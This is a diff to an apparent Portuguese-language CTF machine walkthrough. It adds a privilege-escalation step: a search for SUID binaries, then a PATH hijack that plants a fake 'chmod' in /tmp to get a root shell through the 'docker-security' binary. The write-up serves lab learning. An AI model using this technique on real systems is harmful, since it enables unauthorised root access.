@@ -322,12 +322,27 @@ Portanto salvamos em nossa maquina e tentamos usar.
 ee boom, we are in ~
 
 
+Após um pouco de enumeração, podemos encontrar esse binário:
+![Image](https://i.imgur.com/5m7SHHm.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Ao tentar ler o arquivo /usr/local/bin/docker-security podemos perceber que o arquivo executa o comando: chmod 700 /usr/bin/dockerchmod
+![Image](https://i.imgur.com/XgwF5qp.png)
 
+Então vamos tentar um path hijacking, para isso vamos criar um arquivo chamado chmod na pasta /tmp
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo "/bin/bash" > chmod
+chmod 777 chmod
+export PATH=/tmp:$PATH
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Após isso executamos o arquivo /usr/local/bin/docker-security
 
+E então...
+![Image](https://i.imgur.com/1he8WVJ.png)
 
-to escrevendo guenta aew
-
+we are root ~
 
 if i helped you, add + respect at my profile :D
 <html>
@@ -340,4 +355,6 @@ if i helped you, add + respect at my profile :D
 My references:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 https://hackerone.com/reports/827052
+https://docs.gitlab.com/12.10/ee/security/reset_root_password.html
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
